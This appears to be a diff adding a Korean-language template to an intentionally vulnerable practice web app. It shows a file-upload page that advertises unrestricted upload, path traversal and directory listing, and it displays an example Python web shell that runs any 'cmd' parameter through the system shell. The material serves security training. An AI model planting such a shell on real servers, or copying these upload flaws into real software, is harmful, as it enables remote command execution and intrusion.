@@ -1,0 +1,54 @@
+{% extends "base.html" %}
+{% block title %}— 파일 업로드{% endblock %}
+{% block content %}
+<div class="card">
+  <div class="card-title">파일 업로드 <span class="vuln-badge">Unrestricted Upload</span> <span class="vuln-badge">Path Traversal</span></div>
+  <div class="hint">
+    취약점:<br>
+    • 파일 확장자/MIME 타입 검증 없음 → .php, .py, .sh 업로드 가능<br>
+    • 원본 파일명 그대로 저장 → 덮어쓰기/경로 조작 가능<br>
+    • 업로드 디렉토리 목록 노출<br>
+    • 업로드된 파일 직접 URL 접근: <code>/uploads/&lt;filename&gt;</code>
+  </div>
+
+  {% if message %}
+  <div class="alert alert-ok">{{ message }}<br>
+  {% if uploaded_path %}<a href="{{ uploaded_path }}" style="color:var(--accent2);">직접 접근: {{ uploaded_path }}</a>{% endif %}
+  </div>
+  {% endif %}
+
+  <form method="POST" enctype="multipart/form-data">
+    <div class="form-group">
+      <label>파일 선택 (확장자 제한 없음)</label>
+      <input type="file" name="file" style="color:var(--muted);">
+    </div>
+    <button type="submit" class="btn">업로드</button>
+  </form>
+
+  <div class="output" style="margin-top:16px;">
+# 웹쉘 예시 (업로드 후 /uploads/shell.py 접근)
+import os, subprocess
+from flask import request
+def shell():
+    cmd = request.args.get('cmd','id')
+    return subprocess.check_output(cmd, shell=True).decode()
+  </div>
+</div>
+
+<div class="card">
+  <div class="card-title">업로드된 파일 목록 <span class="vuln-badge">디렉토리 리스팅</span></div>
+  {% if files %}
+  <table>
+    <tr><th>파일명</th><th>접근 URL</th></tr>
+    {% for f in files %}
+    <tr>
+      <td>{{ f }}</td>
+      <td><a href="/uploads/{{ f }}" style="color:var(--accent2);">/uploads/{{ f }}</a></td>
+    </tr>
+    {% endfor %}
+  </table>
+  {% else %}
+  <div style="color:var(--muted);font-size:12px;">업로드된 파일 없음</div>
+  {% endif %}
+</div>
+{% endblock %}
